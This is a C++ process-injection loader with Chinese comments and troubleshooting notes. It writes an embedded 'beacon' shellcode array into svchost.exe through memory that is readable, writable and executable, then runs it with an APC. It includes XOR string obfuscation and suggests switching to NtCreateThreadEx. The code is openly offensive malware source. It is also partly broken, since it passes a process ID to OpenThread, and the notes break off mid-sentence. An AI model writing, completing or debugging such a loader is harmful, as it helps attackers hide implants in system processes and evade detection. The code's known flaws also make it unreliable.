```cpp
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <iostream>
#include "beacon.h"   // xxd -i 产出的数组，变量名 beacon_bin

typedef NTSTATUS(NTAPI* pNtAVM)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI* pNtWVM)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(NTAPI* pNtCTE)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS(NTAPI* pNtQIP)(HANDLE, int, PVOID, ULONG, PULONG);

// 简单的字符串混淆：编译期 XOR 0x5A
static void deobf(char* s, int len) { for (int i = 0; i < len; i++) s[i] ^= 0x5A; }

int main() {
    // 1. 动态取 ntdll 函数
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtAVM NtAllocateVirtualMemory = (pNtAVM)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    pNtWVM NtWriteVirtualMemory    = (pNtWVM)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    pNtCTE NtCreateThreadEx        = (pNtCTE)GetProcAddress(hNtdll, "NtCreateThreadEx");

    // 2. 找 svchost.exe
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = { sizeof(pe) };
    DWORD pid = 0;
    while (Process32Next(hSnap, &pe)) {
        if (_stricmp(pe.szExeFile, "svchost.exe") == 0) { pid = pe.th32ProcessID; break; }
    }
    CloseHandle(hSnap);
    if (!pid) return 1;

    // 3. 打开目标进程
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    // 4. 目标进程内分配 RWX
    PVOID remote = nullptr;
    SIZE_T sz = sizeof(beacon_bin);
    NtAllocateVirtualMemory(hProc, &remote, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // 5. 写入 shellcode
    SIZE_T written = 0;
    NtWriteVirtualMemory(hProc, remote, beacon_bin, sizeof(beacon_bin), &written);

    // 6. Early Bird APC：挂到目标主线程，恢复后先执行
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, pid); // 需要先枚举线程，见下方说明
    QueueUserAPC((PAPCFUNC)remote, hThread, 0);
    ResumeThread(hThread);

    std::cout << "[+] injected into PID " << pid << std::endl;
    return 0;
}
```

**需要注意的两个坑：**

1. **OpenThread 拿线程句柄**——上面的 `pid` 传入是错的，得用 `THREADENTRY32` 枚举主线程（`Thread32First/Next`，取 `th32OwnerProcessID == pid` 的第一个线程的 `th32ThreadID`），再 `OpenThread(THREAD_SET_CONTEXT, FALSE, tid)`。svchost 多线程且第一个不一定是主线程，实测挑 `te32ThreadID` 对应 `ResumeThread` 能走通的即可。

2. **`NtCreateThreadEx` 声明在头文件里就被 typedef 用了但没调用**——如果你嫌 APC 不稳，可以换成 `NtCreateThreadEx` 直接远程建线程，参数 `NULL`

